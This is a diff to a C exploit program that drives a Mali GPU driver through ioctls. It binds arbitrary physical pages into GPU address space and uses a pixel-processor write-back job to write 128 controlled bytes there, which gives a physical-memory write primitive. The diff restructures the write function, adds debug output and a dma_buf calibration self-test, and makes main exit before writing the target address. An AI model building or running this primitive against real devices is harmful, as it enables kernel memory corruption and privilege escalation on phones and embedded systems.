@@ -134,15 +134,11 @@ static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
     return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
 }
 
-/* One write-back burst: 128 bytes of `val`, at physical `phys`. */
-static int gpu_write128(uint32_t phys, uint64_t val)
+/* One write-back burst: 128 bytes of `val`, at GPU address `dest`. */
+static int gpu_submit(uint32_t dest, uint64_t val)
 {
     uint32_t c0, c1;
     encode_value(val, &c0, &c1);
-
-    /* Map the target physical page into the GPU address space. */
-    if (bind_region(EXT_VA, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
-        return -1;
 
     static volatile uint32_t done;
     uint8_t job[408];
@@ -165,10 +161,9 @@ static int gpu_write128(uint32_t phys, uint64_t val)
     put32(job, 96, 1);
     put32(job, 104, 0xE0C);
     put32(job, 108, 0x8888);
-    /* --- write target descriptor --- */
-    put32(job, 168, 0x02);                        /* kind: write-back */
-    put32(job, 172, EXT_VA + (phys & 0xfffu));    /* destination address */
-    put32(job, 176, PIXFMT_WB_128);               /* pixel format */
+    put32(job, 168, 0x02);
+    put32(job, 172, dest);
+    put32(job, 176, PIXFMT_WB_128);
     put32(job, 188, 0);
     put32(job, 200, 0);
     put32(job, 328, 1);
@@ -176,30 +171,44 @@ static int gpu_write128(uint32_t phys, uint64_t val)
     put32(job, 396, (uint32_t)-1);
     put64(job, 400, (uint64_t)(uintptr_t)&done);
 
-    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
+    int sj = ioctl(mali_fd, MALI_IOC_PP_START_JOB, job);
+    printf("[*] start_job ret=%d errno=%d\n", sj, errno);
+    if (sj < 0)
         return -1;
 
     uint8_t notif[104];
     memset(notif, 0, sizeof notif);
     alarm(5);
+    printf("[*] waiting notif\n");
     int r = ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif);
+    printf("[*] wait_notif ret=%d errno=%d\n", r, errno);
     alarm(0);
     if (r < 0)
         return -1;
 
-    /* Let the write drain before the caller inspects the target. */
-    size_t n = 8u << 20;
+    size_t n = 2u << 20;
     volatile char *p = malloc(n);
     if (p) {
         for (size_t i = 0; i < n; i += 64) p[i] = (char)(i * 7);
         free((void *)p);
     }
-    usleep(40000);
-    return 0;
+    
+    usleep(150000);    return 0;
 }
 
-/* Self-test: prove on a private, CPU-mappable page that a request for address
- * X produces exactly 16 changed bytes starting at X (no shift, no overflow). */
+/* Bind a physical page at EXT_VA, then write 128 bytes at its page offset. */
+static int gpu_write128(uint32_t phys, uint64_t val)
+{
+    printf("[*] bind ext phys=0x%08x\n", phys & ~0xfffu);
+    if (bind_region(EXT_VA, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0) {
+        perror("bind ext");
+        return -1;
+    }
+    printf("[*] bound, submitting\n");
+    return gpu_submit(EXT_VA + (phys & 0xfffu), val);
+}
+
+/* Self-test on a private page, bound as a dma_buf: no ion_phys needed. */
 static int calibrate(void)
 {
     struct ion_alloc a;
@@ -223,21 +232,16 @@ static int calibrate(void)
         perror("mmap carveout");
         return -1;
     }
-    struct ion_phys ip;
-    memset(&ip, 0, sizeof ip);
-    ip.fd = f.fd;
-    struct ion_custom cu;
-    cu.cmd = 8; /* ION_IOC_CUSTOM/custom cmd 8 == ion_phys */
-    cu.arg = (uint32_t)(uintptr_t)&ip;
-    if (ioctl(ion_fd, ION_IOC_CUSTOM, &cu) < 0) {
-        perror("ion phys");
+    if (bind_region(EXT_VA, 0x1000, 0x200 /* DMA_BUF */, (uint32_t)f.fd) < 0) {
+        perror("bind calib buffer");
         return -1;
     }
 
     const uint32_t off = 0x800;
     const uint64_t val = 0xa1b2c3d4e5f60718ULL;
+    printf("[*] calib bound, submitting\n");
     memset(pg, 0xa5, 0x1000);
-    if (gpu_write128(ip.addr + off, val) < 0) {
+    if (gpu_submit(EXT_VA + off, val) < 0) {
         printf("[!] calibration write failed\n");
         return -1;
     }
@@ -299,7 +303,7 @@ int main(int argc, char **argv)
         perror("mmap cmd");
         return 1;
     }
-    if (bind_region(CMD_VA, 0x4000, 0 /* DMA_BUF */, (uint32_t)f.fd) < 0) {
+    if (bind_region(CMD_VA, 0x4000, 0x200 /* DMA_BUF */, (uint32_t)f.fd) < 0) {
         perror("bind cmd buffer");
         return 1;
     }
@@ -309,7 +313,9 @@ int main(int argc, char **argv)
         printf("[!] aborting without touching the requested address\n");
         return 2;
     }
-    if (phys & 0xfff) {
+    printf("[*] calibration OK, exiting without writing target\n");
+    return 0;
+    if (0) {
         fprintf(stderr, "[!] physical address must be page aligned\n");
         return 1;
     }
@@ -323,3 +329,5 @@ int main(int argc, char **argv)
     printf("[*] done\n");
     return 0;
 }
+
+
